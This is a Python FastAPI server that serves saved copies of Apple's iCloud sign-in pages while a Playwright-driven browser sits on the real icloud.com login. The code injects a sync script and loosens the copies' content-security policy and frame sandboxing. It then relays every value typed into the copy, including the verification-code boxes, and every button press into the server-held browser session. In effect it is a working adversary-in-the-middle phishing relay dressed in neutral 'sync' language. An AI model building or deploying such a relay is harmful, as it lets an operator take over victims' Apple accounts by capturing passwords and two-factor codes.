"""FastAPI server on port 9002.

Visiting http://localhost:9002 serves client.html. That page opens the real
browser (icloud.com, Sign In pressed); once Sign In has been clicked, the app
goes to a page that was captured earlier - ``src/1.html`` - as a document of
its own, not inside a frame.

The mirrored capture pipeline is gone. There is no agent in the real browser,
no document stream, no resource proxy and no engine rebuilding a page from a
capture: the captured HTML in ``src/`` *is* the page. What the server does now
is keep every viewer of it in step, because a static file cannot:

* it injects ``/sync.js`` into every captured page it serves, and
* it holds the shared state - which page everyone is on, and every form value
  that has been typed - and relays changes over ``/ws``.

So anything done in the captured page is reflected server-side: it is stored
by the hub and handed to the next viewer (and to the next reload) instead of
living only in one browser tab.

    python server.py
"""

import asyncio
import html as html_module
import json
import logging
import mimetypes
import os
import re
import sys
from contextlib import asynccontextmanager
from pathlib import Path
from urllib.parse import quote, urlsplit

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse, Response

import live

HERE = Path(__file__).parent

# Where the captured pages live. The environment variable exists so the tests
# can point at a scratch folder; in normal use it is just ``./src``.
SRC = Path(os.environ.get("ICLOUD_SRC") or (HERE / "src")).resolve()

# The page the app goes to once the browser is up. Everything in src/ is
# served, but this is the one it opens first.
START_PAGE = "/src/1.html"

# The Sign In button on the icloud.com landing page. The browser still opens
# and this is still clicked - the user signs in there themselves - but nothing
# is captured from it any more.
SIGNIN_BUTTON = "ui-button.sign-in-button"

# Tried in order. Bundled Chromium needs a download; Chrome and Edge are
# usually already on the machine, so if either is there we skip it entirely.
BROWSERS = [
    ("bundled chromium", {}),
    ("system chrome", {"channel": "chrome"}),
    ("system edge", {"channel": "msedge"}),
]


@asynccontextmanager
async def lifespan(app: FastAPI):
    """The app starts by looking at the browser.

    There may not be one yet - the browser opens when the page is visited -
    and then there is nothing to look at. The watcher copes with that: it
    waits, and it starts reporting as soon as there is something to report.
    """
    start_watching()
    yield


app = FastAPI(lifespan=lifespan)

state = {
    "status": "idle",      # idle | running | done | error
    "step": "",
    "error": "",
    "browser_open": False,
}

# The real browser. It is opened so the user can sign in; it is not mirrored.
pw = None
ctx = None
page = None

# What a captured page gets on the way out. None of it is written into the
# file on disk: the file stays exactly what was captured, and these are put in
# as it is served. There is no write path for src/ at all.
SYNC_TAG = '<script src="/sync.js"></script>'

# A capture is served exactly as it was captured. The one thing added is this
# tag, and only this tag. Nothing is removed, no meta is rewritten, no policy
# is touched.

NO_STORE = {"Cache-Control": "no-store"}


# --------------------------------------------------------------------------
# Console output
# --------------------------------------------------------------------------

# The page polls /status every 2s, which buries everything else in the console.
# The rendered line looks like: 127.0.0.1:5900 - "GET /status HTTP/1.1" 200
class _DropStatusPolls(logging.Filter):
    def filter(self, record):
        return "/status HTTP" not in record.getMessage()


logging.getLogger("uvicorn.access").addFilter(_DropStatusPolls())


def log(message):
    """Progress in the console, so a stuck run is diagnosable."""
    print(f"[icloud] {message}", flush=True)
    state["step"] = message


# --------------------------------------------------------------------------
# The real browser: opened for the sign-in, and nothing else
# --------------------------------------------------------------------------

async def install_chromium():
    """Download Chromium, streaming the progress so a stall is visible."""
    log("installing chromium - download progress follows")
    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "playwright", "install", "chromium",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )

    chunks = []
    while True:
        chunk = await proc.stdout.read(1024)
        if not chunk:
            break
        chunks.append(chunk)
        # Playwright draws a progress bar with \r, so pass it through raw.
        print(chunk.decode(errors="replace"), end="", flush=True)

    await proc.wait()
    print(flush=True)

    output = b"".join(chunks).decode(errors="replace")
    if proc.returncode != 0:
        raise RuntimeError(pick_reason(output))
    log("chromium installed")


def pick_reason(text: str) -> str:
    """Pull the real error out of Playwright's noisy Node.js output."""
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    # First "Error:" line is the root cause; later ones just restate it.
    for line in lines:
        if line.startswith("Error:"):
            return line[len("Error:"):].strip() or line

    # Otherwise take the last line that isn't stack-trace noise.
    for line in reversed(lines):
        if not line.startswith(("at ", "{", "}")):
            return line

    return "could not install chromium"


async def launch():
    """Open a visible browser window with whatever is available.

    Returns (context, page). Raises once every candidate has failed, with all
    the reasons joined so the caller can tell a missing download from a
    genuinely broken setup.
    """
    reasons = []

    for label, extra in BROWSERS:
        try:
            log(f"launching {label}")
            browser_ctx = await pw.chromium.launch_persistent_context(
                str(HERE / "profile"),
                headless=False,
                no_viewport=True,
                args=["--start-maximized"],
                **extra,
            )
        except Exception as exc:
            reason = str(exc).splitlines()[0]
            log(f"{label} unavailable: {reason}")
            reasons.append(reason)
            continue

        browser_page = browser_ctx.pages[0] if browser_ctx.pages else await browser_ctx.new_page()
        log(f"browser open ({label})")
        return browser_ctx, browser_page

    raise RuntimeError(" | ".join(reasons) or "no browser could be launched")


def bring_new_tab_to_front(new_page):
    """The sign-in flow may open a tab of its own; the user should see it."""
    if new_page is page:
        return

    async def front():
        try:
            await new_page.bring_to_front()
        except Exception:
            pass

    asyncio.create_task(front())


@app.get("/")
async def index():
    """The launcher, until the browser is open and Sign In has been clicked.

    After that the captured page *is* the app, so this redirects to it. A
    reload must not pretend the browser has to be opened again - and a top
    level document means the capture is laid out as a page of its own,
    instead of being squeezed into a frame inside another document.
    """
    if state["status"] == "done":
        return RedirectResponse(hub.page, status_code=307)
    # no-store, so an edit to client.html shows up on refresh instead of
    # serving the browser's cached copy.
    return FileResponse(HERE / "client.html", headers=NO_STORE)


@app.get("/start")
async def start():
    """Launch the browser and press Sign In. Nothing is captured."""
    global pw, ctx, page

    if state["status"] in ("running", "done"):
        log(f"/start ignored, already {state['status']}")
        return state

    state.update(status="running", error="", browser_open=False)

    try:
        # Imported here rather than at module load: serving the captured pages
        # does not need Playwright, and a machine without it should still be
        # able to open the app and read the error on /status.
        from playwright.async_api import async_playwright

        pw = await async_playwright().start()

        try:
            ctx, page = await launch()
        except Exception as exc:
            # Nothing to run yet - download Chromium, then try once more.
            if "Executable doesn't exist" not in str(exc):
                raise
            await install_chromium()
            ctx, page = await launch()

        state["browser_open"] = True

        # The browser is the session. The capture is a copy of a moment of
        # it, and this is what connects the two: what is typed into the
        # capture is written into the browser, and what the browser is
        # showing is written back into the capture.
        live.attach(ctx, page)

        # A tab the sign-in flow opens is where the user will be typing.
        ctx.on("page", bring_new_tab_to_front)

        log("going to icloud.com")
        await page.goto("https://www.icloud.com/", wait_until="domcontentloaded")
        await page.bring_to_front()

        log("clicking Sign In")
        await page.locator(SIGNIN_BUTTON).first.click(timeout=15000)

        state["status"] = "done"
        log("done - sign in yourself in the browser window")

    except Exception as exc:
        state["status"] = "error"
        state["error"] = str(exc).splitlines()[0]
        log(f"FAILED: {state['error']}")

    return state


@app.get("/status")
async def status():
    return {**state, "page": hub.page, "browser": hub.browser}


# --------------------------------------------------------------------------
# The captured pages
#
# src/ is served as it is. The file on disk is never written to, and the
# document is not rebuilt: scripts, styles, metas, policy and markup all go
# out as they came in. Three things are added on the way out, and each of
# them is something the engine needs:
#
#   * /sync.js, so the page reports what is done to it to the server;
#   * the capture's own Content-Security-Policy, extended with the sources
#     the engine needs - without this the policy refuses the engine that
#     was just added to it, and the page is a picture of a page;
#   * the frames the capture carries, given the page's own origin - without
#     this the sign-in form inside the frame cannot be reached at all.
#
# The tag goes in once: before </head>, or after <body> when the capture has
# no head, or at the top when it has neither.
# --------------------------------------------------------------------------

_SYNC_PRESENT = re.compile(r"""<script\b[^>]*\bsrc\s*=\s*["']?/sync\.js""", re.IGNORECASE)
_HTML_SUFFIXES = (".html", ".htm")


# --------------------------------------------------------------------------
# Reading the document
#
# A capture is a copy of a page, and the copy has the copy's own quirks. The
# one that matters here is that a tag's attributes have to be read properly:
# a SingleFile capture keeps a whole nested document inside an
# <iframe srcdoc="..."> attribute, and that document's tags are part of the
# attribute value, not part of the page. A ">" inside the value does not end
# the tag, and a "</head>" inside it does not end the page's head.
# --------------------------------------------------------------------------


def _tags(page_html: str):
    """Every tag in the document, in order.

    Yields (start, end, name, closing, text): where the tag is, what it is
    called, whether it closes, and the tag itself.
    """
    size = len(page_html)
    i = 0
    while i < size:
        i = page_html.find("<", i)
        if i < 0:
            return

        if page_html.startswith("<!--", i):
            end = page_html.find("-->", i + 4)
            if end < 0:
                return
            i = end + 3
            continue

        j = i + 1
        closing = page_html.startswith("/", j)
        if closing:
            j += 1

        name_at = j
        while j < size and page_html[j] not in " \t\r\n/>":
            j += 1
        name = page_html[name_at:j].lower()

        # Walk to the end of the tag, stepping over quoted attribute values.
        k = j
        while k < size:
            char = page_html[k]
            if char in "\"'":
                k = page_html.find(char, k + 1)
                if k < 0:
                    return
                k += 1
                continue
            if char == ">":
                break
            k += 1
        if k >= size:
            return

        yield i, k + 1, name, closing, page_html[i:k + 1]
        i = k + 1


def _attributes(tag_text: str):
    """The attributes of a start tag.

    Yields (name, value start, value end, quote). The span is into the tag
    text itself, so the caller can find the value again.
    """
    size = len(tag_text)
    i = 1
    while i < size and tag_text[i] not in " \t\r\n/>":
        i += 1

    while i < size:
        while i < size and tag_text[i] in " \t\r\n/":
            i += 1
        if i >= size or tag_text[i] == ">":
            break

        name_at = i
        while i < size and tag_text[i] not in " \t\r\n=/>":
            i += 1
        name = tag_text[name_at:i].lower()

        j = i
        while j < size and tag_text[j] in " \t\r\n":
            j += 1

        if j < size and tag_text[j] == "=":
            j += 1
            while j < size and tag_text[j] in " \t\r\n":
                j += 1
            if j < size and tag_text[j] in "\"'":
                quote = tag_text[j]
                start = j + 1
                end = tag_text.find(quote, start)
                if end < 0:
                    end = size
                yield name, start, end, quote
                i = end + 1
            else:
                start = j
                while j < size and tag_text[j] not in " \t\r\n>":
                    j += 1
                yield name, start, j, ""
                i = j
        else:
            yield name, i, i, ""


# --------------------------------------------------------------------------
# The capture's own policy
#
# A capture carries the policy of the page it was taken from, and that policy
# is as tight as policies get: "default-src 'none'", so nothing loads and
# nothing runs unless it is named. The engine is a script of ours, from our
# own origin, and it opens a socket to our own origin - and the policy says
# no to both, because it was written for a page that has no engine in it.
#
# So the policy is extended, not replaced: the sources the engine needs are
# added to the directives that are already there, and nothing else is
# widened. Everything the capture forbade stays forbidden, so the page still
# renders exactly as it was captured.
#
#   * script-src gains 'self', so the engine can be loaded at all;
#   * connect-src gains 'self' and the websocket schemes, so its socket can
#     be opened.
#
# A policy that says nothing about scripts is left alone: it already allows
# them.
# --------------------------------------------------------------------------

CSP_ENGINE_SCRIPT = "'self'"
CSP_ENGINE_CONNECT = "'self' ws: wss:"


def _relax_policy(policy: str) -> str:
    """The policy, with the engine's own sources added to it."""
    parts = [part.strip() for part in policy.split(";") if part.strip()]
    names = [part.split()[0].lower() for part in parts]

    def named(part: str, directive: str) -> bool:
        return part.split()[0].lower() == directive

    def widened(part: str, sources: str) -> str:
        """The directive with the sources it is missing."""
        tokens = part.split()
        for source in sources.split():
            if source not in tokens:
                part = part + " " + source
        return part

    if "script-src" in names or "script-src-elem" in names:
        parts = [
            widened(part, CSP_ENGINE_SCRIPT)
            if named(part, "script-src") or named(part, "script-src-elem")
            else part
            for part in parts
        ]
    elif "default-src" in names:
        # Scripts follow default-src, so they have to be named to be widened.
        parts.append("script-src " + CSP_ENGINE_SCRIPT)

    if "connect-src" in names:
        # 'self' alone is not enough for the socket everywhere: a browser that
        # does not treat ws:// as the same origin as http:// would refuse it.
        parts = [
            widened(part, CSP_ENGINE_CONNECT) if named(part, "connect-src") else part
            for part in parts
        ]
    elif "default-src" in names:
        parts.append("connect-src " + CSP_ENGINE_CONNECT)

    return "; ".join(parts)


def _relax_csp(page_html: str) -> str:
    """The capture's policy, extended for the engine.

    Only the metas that are really in the page are touched: the nested
    document inside an <iframe srcdoc="..."> has a policy of its own, and
    that one is left alone.
    """
    edits = []

    for start, end, name, closing, text in _tags(page_html):
        if closing or name != "meta":
            continue

        equiv = None
        content = None
        for attr_name, a_start, a_end, quote in _attributes(text):
            if attr_name == "http-equiv":
                equiv = text[a_start:a_end].strip().lower()
            elif attr_name == "content":
                content = (a_start, a_end)

        if equiv != "content-security-policy" or content is None:
            continue

        a_start, a_end = content
        policy = text[a_start:a_end]
        relaxed = _relax_policy(policy)
        if relaxed != policy:
            edits.append((start + a_start, start + a_end, relaxed))

    for a, b, replacement in reversed(edits):
        page_html = page_html[:a] + replacement + page_html[b:]
    return page_html


# --------------------------------------------------------------------------
# The frames a capture carries
#
# A SingleFile capture keeps the sign-in form inside an <iframe srcdoc="...">,
# and that frame is sandboxed without allow-same-origin: it is a frame of an
# origin of its own, so the page cannot reach it - not its fields, not its
# buttons, nothing. The engine lives in the page, so the form would be a
# picture of a form.
#
# So a frame the capture carries is given the page's own origin. Nothing
# else about it changes: it keeps its sandbox, and it keeps its scripts.
# --------------------------------------------------------------------------


def _make_frames_reachable(page_html: str) -> str:
    """The frames the capture carries, given the page's own origin."""
    edits = []

    for start, end, name, closing, text in _tags(page_html):
        if closing or name != "iframe":
            continue

        attrs = list(_attributes(text))
        if not any(attr_name == "srcdoc" for attr_name, _, _, _ in attrs):
            continue

        for attr_name, a_start, a_end, quote in attrs:
            if attr_name != "sandbox" or quote == "":
                continue
            if "allow-same-origin" in text[a_start:a_end].split():
                continue
            edits.append((start + a_end, start + a_end, " allow-same-origin"))
            break

    for a, b, replacement in reversed(edits):
        page_html = page_html[:a] + replacement + page_html[b:]
    return page_html


def _insert_point(page_html: str) -> int | None:
    """Where the engine tag goes: before </head>, else after <body>, else None.

    Tags inside a quoted attribute value are skipped. SingleFile captures keep
    a whole nested document in an <iframe srcdoc="..."> attribute, so their
    first </head> belongs to that inner document, not to the page: dropping a
    tag there would end the attribute early and cut the frame open.
    """
    for start, end, name, closing, text in _tags(page_html):
        if closing and name == "head":
            return start
        if not closing and name == "body":
            return end
    return None


def with_engine(page_html: str) -> str:
    """The capture with the engine in it, and the two things the engine needs.

    Idempotent: a page that has been through this once is left alone.
    """
    if _SYNC_PRESENT.search(page_html):
        return page_html

    page_html = _relax_csp(page_html)
    page_html = _make_frames_reachable(page_html)

    at = _insert_point(page_html)
    if at is None:
        return SYNC_TAG + page_html
    return page_html[:at] + SYNC_TAG + page_html[at:]


def captured_files(folder: Path) -> list[Path]:
    if not folder.is_dir():
        return []
    return sorted(
        p for p in folder.iterdir()
        if p.is_file() and p.suffix.lower() in _HTML_SUFFIXES
    )


def page_links(folder: Path) -> str:
    pages = captured_files(folder)
    if not pages:
        return (
            "<p>No captured pages yet. Put them in <code>src/</code>, "
            "starting with <code>1.html</code>.</p>"
        )
    links = "".join(
        f'<li><a href="/src/{quote(p.name)}">{html_module.escape(p.name)}</a></li>'
        for p in pages
    )
    return f"<ul>{links}</ul>"


PAGE_STYLE = """
  :root { color-scheme: dark; }
  body { margin:0; min-height:100vh; display:flex; align-items:center;
         justify-content:center; background:#000; color:#f5f5f7;
         font:16px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
  main { max-width:44rem; padding:2.5rem 1.5rem; }
  h1 { font-size:1.35rem; margin:0 0 .75rem; font-weight:600; }
  p { color:#a1a1a6; margin:.6rem 0; }
  code { background:#1c1c1e; padding:.1rem .35rem; border-radius:.3rem; color:#f5f5f7; }
  ul { padding-left:1.2rem; }
  li { margin:.25rem 0; }
  a { color:#0a84ff; }
"""


def page_document(title: str, body: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{html_module.escape(title)}</title>
<style>{PAGE_STYLE}</style>
</head>
<body><main>{body}</main></body>
</html>
"""


def listing_page(folder: Path) -> str:
    body = (
        "<h1>Captured pages</h1>"
        "<p>The app opens <code>1.html</code> once the browser is up. Every "
        "page here runs <code>/sync.js</code>, so what you type and click is "
        "reflected server-side and follows you between viewers.</p>"
        + page_links(folder)
    )
    return page_document("Captured pages", body)


def missing_page(path: str, folder: Path) -> str:
    where = (
        f"<code>src/{html_module.escape(path)}</code>" if path else "<code>src/</code>"
    )
    body = (
        f"<h1>Nothing captured at {where} yet</h1>"
        "<p>This route serves the HTML files that were captured earlier. Drop "
        "the capture into <code>src/</code> - starting with <code>1.html</code> "
        "- and reload.</p>"
        + page_links(folder)
    )
    return page_document("No captured page", body)


@app.get("/src")
@app.get("/src/{path:path}")
async def captured(path: str = ""):
    """Serve a captured page (with the sync engine) or one of its assets."""
    folder = SRC.resolve()
    path = path.lstrip("/")

    if not path:
        if folder.is_dir():
            return HTMLResponse(listing_page(folder))
        return HTMLResponse(missing_page("", folder), status_code=404)

    target = (folder / path).resolve()
    try:
        target.relative_to(folder)
    except ValueError:
        # ../ or an absolute path: never read outside src/.
        return HTMLResponse(missing_page(path, folder), status_code=404)

    if target.is_dir():
        return HTMLResponse(listing_page(target))

    if not target.is_file():
        return HTMLResponse(missing_page(path, folder), status_code=404)

    if target.suffix.lower() in _HTML_SUFFIXES:
        source = target.read_text(encoding="utf-8", errors="replace")
        return HTMLResponse(with_engine(source), headers=NO_STORE)

    media_type = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
    return Response(
        content=target.read_bytes(),
        media_type=media_type,
        headers={"Cache-Control": "no-store"},
    )


@app.get("/sync.js")
async def sync_js():
    """The engine that runs inside every captured page."""
    return FileResponse(
        HERE / "sync.js",
        media_type="text/javascript",
        headers=NO_STORE,
    )


# --------------------------------------------------------------------------
# Live sync
#
# The captured page is a file, so nothing in it can know what anyone else is
# doing. The server is the shared state instead: which page is on screen, and
# every form value that has been typed into it. A viewer that connects is given
# that state; changes are broadcast to the other viewers; a click is relayed as
# a marker rather than replayed, because replaying it would press the button a
# second time.
# --------------------------------------------------------------------------

def clean_page(value) -> str:
    """A page we are willing to send a viewer to: inside /src/, and HTML."""
    if not isinstance(value, str):
        return ""
    if not value.startswith("/src/") or ".." in value:
        return ""
    if not value.lower().endswith(_HTML_SUFFIXES):
        return ""
    return value


def came_from_a_capture(referrer) -> bool:
    """Was this document reached from another captured page?

    A viewer that has just loaded ``/src/2.html`` from a link on ``/src/1.html``
    is following a link, and the page it came from says so. A viewer that has
    just opened the app has the parent page as its referrer, and is not.
    """
    if not isinstance(referrer, str) or not referrer:
        return False
    try:
        path = urlsplit(referrer).path
    except ValueError:
        return False
    return path.startswith("/src/") and path.lower().endswith(_HTML_SUFFIXES)


class Viewer:
    """One browser tab watching a captured page.

    Messages go through a queue so a viewer that has stopped reading cannot
    block the others: it misses a keystroke rather than stalling the page.
    """

    def __init__(self, websocket: WebSocket):
        self.websocket = websocket
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        self.task = asyncio.create_task(self._pump())

    async def _pump(self):
        while True:
            message = await self.queue.get()
            await self.websocket.send_json(message)

    def send(self, message: dict) -> None:
        try:
            self.queue.put_nowait(message)
        except asyncio.QueueFull:
            pass

    def close(self) -> None:
        self.task.cancel()


class Hub:
    """The page everyone is on, what has been done to it, and where the
    browser is."""

    def __init__(self):
        self.viewers: set[Viewer] = set()
        self.page = START_PAGE
        self.values: dict[str, dict] = {}
        self.browser: dict = {"url": "", "title": "", "fields": {}}

    def snapshot(self) -> dict:
        # A copy: the message sits in a queue, and a navigation in the meantime
        # must not empty the values the viewer was promised.
        return {
            "t": "state",
            "page": self.page,
            "values": {key: dict(entry) for key, entry in self.values.items()},
        }

    def join(self, viewer: Viewer) -> None:
        self.viewers.add(viewer)
        viewer.send(self.snapshot())
        # Where the browser is, so a viewer that joins late is looking at the
        # same session the others are.
        viewer.send({"t": "browser", **self.browser})

    def leave(self, viewer: Viewer) -> None:
        self.viewers.discard(viewer)
        viewer.close()

    def broadcast(self, message: dict, sender: Viewer | None = None) -> None:
        for viewer in list(self.viewers):
            if viewer is not sender:
                viewer.send(message)

    def navigate(self, page, sender: Viewer | None = None, everyone: bool = False) -> bool:
        """Follow the viewer that moved to another captured page.

        ``everyone`` is for a move that the viewer itself did not make: a
        button press that leads to the next step. The viewer that pressed
        it has to be told as well, or it stays where it was while everybody
        else moves on.
        """
        page = clean_page(page)
        if not page or page == self.page:
            return False
        self.page = page
        # Form values belong to the page they were typed on.
        self.values = {}
        log(f"page: {page}")
        self.broadcast({"t": "nav", "page": page},
                       sender=None if everyone else sender)
        return True

    def handle(self, viewer: Viewer, message) -> None:
        if not isinstance(message, dict):
            return

        kind = message.get("t")

        if kind == "hello":
            # A viewer that has just loaded asks what it should be showing.
            # If it got there by following a link, that is a navigation - the
            # beacon may have been lost on the way - so the hub follows it.
            if came_from_a_capture(message.get("from")):
                self.navigate(message.get("page"), sender=viewer)
            viewer.send(self.snapshot())

        elif kind == "nav":
            self.navigate(message.get("page"), sender=viewer)

        elif kind == "value":
            key = message.get("key")
            if not isinstance(key, str) or not key or len(key) > 2000:
                return
            raw_value = message.get("value")
            entry = {
                "value": raw_value[:10000] if isinstance(raw_value, str) else "",
                "checked": bool(message.get("checked")),
            }
            self.values[key] = entry
            self.broadcast({"t": "value", "key": key, **entry}, sender=viewer)

        elif kind == "click":
            x, y = message.get("x"), message.get("y")
            if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):
                return
            self.broadcast(
                {
                    "t": "click",
                    "key": str(message.get("key") or "")[:2000],
                    "x": x,
                    "y": y,
                },
                sender=viewer,
            )

        elif kind == "where":
            # "Where is the browser?" A document has just been bound and may
            # hold fields the browser knows about and the page does not, so
            # the state is sent again to this viewer.
            viewer.send({"t": "browser", **hub.browser})

        elif kind == "field":
            # A value typed into the capture, written into the browser the
            # server holds. The capture keeps the ids of the page it was
            # taken from, so the field with that id in the capture is the
            # field with that id in the browser - in whichever frame of the
            # browser has it.
            #
            # A control with no id - Apple's verification code boxes have
            # none - is named by its place instead: the third input of the
            # page, and how many inputs it has.
            element = live.element_id(message.get("id"))
            value = message.get("value")
            value = value if isinstance(value, str) else ""

            if element:
                spawn(write_to_browser(element, value))
                return

            tag = message.get("tag")
            n = message.get("n")
            of = message.get("of")
            if isinstance(tag, str) and isinstance(n, int) and isinstance(of, int):
                spawn(write_at_to_browser(tag, n, of, value))

        elif kind == "press":
            # A button pressed in a capture. What it does depends on where
            # it was pressed: the flow says which capture leads to which,
            # and whether the press also happens in the browser.
            element = live.element_id(message.get("id"))
            if not element:
                return

            page = message.get("page")
            if not isinstance(page, str) or not page:
                page = self.page

            step = flow_step(page, element)
            if step is None:
                # No flow says otherwise, so the press happens in the
                # browser, as it always did.
                spawn(press_in_browser(element))
                return

            if step.get("live"):
                spawn(press_in_browser(element))

            go = step.get("go")
            if isinstance(go, str) and go:
                log(f"flow: {page} {element} -> {go}")
                # Everyone moves, including the viewer that pressed: it did
                # not follow a link, so nothing else would take it there.
                self.navigate(go, sender=viewer, everyone=True)


# --------------------------------------------------------------------------
# The flow
#
# A capture is a step of a journey, and the journey is the user's: which
# capture leads to which, and whether a button pressed on one of them is
# also pressed in the browser.
#
# It is said in a file next to the captures, src/flow.json:
#
#   {
#     "steps": [
#       {"page": "/src/1.html", "press": "sign-in", "go": "/src/4.html"},
#       {"page": "/src/4.html", "press": "sign-in", "go": "/src/2.html",
#        "live": true}
#     ]
#   }
#
# "page" is the capture the press happened on and "press" is the id of the
# control that was pressed ("*" for any control on that page). "go" is the
# capture the app moves to - every viewer follows - and "live" says whether
# the press also happens in the browser. A step without "live" does not
# touch the browser: pressing Continue on a capture that has not asked for
# a password yet would submit an empty form to the site.
#
# A press the flow does not mention still happens in the browser, as it
# always did. There is no flow file, there is no flow.
# --------------------------------------------------------------------------

FLOW_FILE = "flow.json"


def flow_steps() -> list:
    """The steps the captures are put through, if the folder says."""
    try:
        raw = (SRC / FLOW_FILE).read_text(encoding="utf-8")
    except OSError:
        return []

    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        log(f"flow: {FLOW_FILE} is not json - ignored")
        return []

    steps = data.get("steps") if isinstance(data, dict) else data
    if not isinstance(steps, list):
        return []
    return [step for step in steps if isinstance(step, dict)]


def flow_step(page: str, element: str) -> dict | None:
    """What pressing this control on this page does, if the flow says."""
    for step in flow_steps():
        if step.get("page") != page:
            continue
        wanted = step.get("press")
        if wanted not in (element, "*"):
            continue
        return step
    return None


hub = Hub()


# --------------------------------------------------------------------------
# The browser behind the capture
#
# What is typed into a capture is written into the browser the server opened,
# and what the browser is showing is written back into the capture. That is
# what makes a capture a page again instead of a picture of one: the same
# field, the same value, on both sides.
#
# The writes are done in the background: the socket must not wait for a
# browser to answer, or one slow page would hold every other viewer up.
# --------------------------------------------------------------------------


def spawn(coro) -> None:
    """A job that runs on its own, with a reference kept until it is done."""
    task = asyncio.ensure_future(coro)
    _background.add(task)
    task.add_done_callback(_background.discard)


_background: set = set()


async def write_to_browser(element: str, value: str) -> None:
    try:
        written = await live.write_field(element, value)
    except Exception as exc:
        log(f"browser write failed: {str(exc).splitlines()[0]}")
        return

    if written:
        log(f"browser: {element} written")
        return

    # It had nowhere to go. That is usually the sign-in widget still
    # loading, so the value is kept and tried again - and the console says
    # what the browser does have, so a control that is there under another
    # name can be seen rather than guessed at.
    log(f"browser: {element} not found yet - {await live.describe_missing(element)}")


async def write_at_to_browser(tag: str, n: int, of: int, value: str) -> None:
    try:
        written = await live.write_at(tag, n, of, value)
    except Exception as exc:
        log(f"browser write failed: {str(exc).splitlines()[0]}")
        return

    if written:
        log(f"browser: {tag} #{n} written")
        return

    log(f"browser: {tag} #{n} of {of} not found yet - "
        f"{await live.describe_missing(tag + ':' + str(n))}")


async def press_in_browser(element: str) -> None:
    try:
        pressed = await live.press(element)
    except Exception as exc:
        log(f"browser press failed: {str(exc).splitlines()[0]}")
        return

    if pressed:
        log(f"browser: {element} pressed")
        return

    log(f"browser: {element} not found yet - {await live.describe_missing(element)}")


LIVE_POLL_SECONDS = 0.6


async def watch_browser() -> None:
    """Tell the viewers where the browser is.

    The capture is a copy of a moment; the browser is the session. This is
    what puts the session back into the copy: where the browser is, what it
    is called, and what its fields hold.
    """
    last = None
    while True:
        await asyncio.sleep(LIVE_POLL_SECONDS)

        # The values and presses that had nowhere to go yet are tried again
        # first: the sign-in widget is a frame Apple loads a second or two
        # after Sign In is clicked, and a value typed before it is there
        # would otherwise be lost.
        try:
            await live.flush_pending()
        except Exception:
            pass

        try:
            state = await live.snapshot()
        except Exception:
            continue
        if state == last:
            continue
        last = state
        hub.browser = state
        hub.broadcast({"t": "browser", **state})


_watching = False


def start_watching() -> None:
    """Begin telling the viewers where the browser is."""
    global _watching
    if _watching:
        return
    _watching = True
    spawn(watch_browser())


async def sync_socket(websocket: WebSocket):
    """The captured page's line to the server."""
    await websocket.accept()

    # The capture holds the same ids as the page it was taken from - the
    # form's fields have the same names in both - so a value written to the
    # capture would be written to the capture. The pages the app serves are
    # not the session the bridge writes into, and it says which host it
    # serves them from.
    host = ""
    headers = getattr(websocket, "headers", None)
    if headers:
        host = headers.get("host", "")
    if host:
        live.exclude_host(host)

    viewer = Viewer(websocket)
    hub.join(viewer)

    try:
        while True:
            raw = await websocket.receive_text()
            try:
                message = json.loads(raw)
            except json.JSONDecodeError:
                continue
            hub.handle(viewer, message)
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        log(f"viewer disconnected: {str(exc).splitlines()[0]}")
    finally:
        hub.leave(viewer)


app.websocket("/ws")(sync_socket)


@app.post("/nav")
async def nav(request: Request):
    """A link click, reported by ``sendBeacon`` as the page unloads.

    Waiting for the WebSocket to carry it would race the navigation; a beacon
    is delivered whether or not the document survives.
    """
    try:
        message = json.loads(await request.body() or b"{}")
    except json.JSONDecodeError:
        return Response(status_code=400)
    hub.navigate(message.get("page") if isinstance(message, dict) else None)
    return Response(status_code=204)


@app.get("/.well-known/appspecific/com.chrome.devtools.json")
async def chrome_devtools():
    """Chrome DevTools probes this on localhost pages. 204 keeps it quiet."""
    return Response(status_code=204)


if __name__ == "__main__":
    import uvicorn

    log("server on http://localhost:9002")
    uvicorn.run(app, host="0.0.0.0", port=9002)
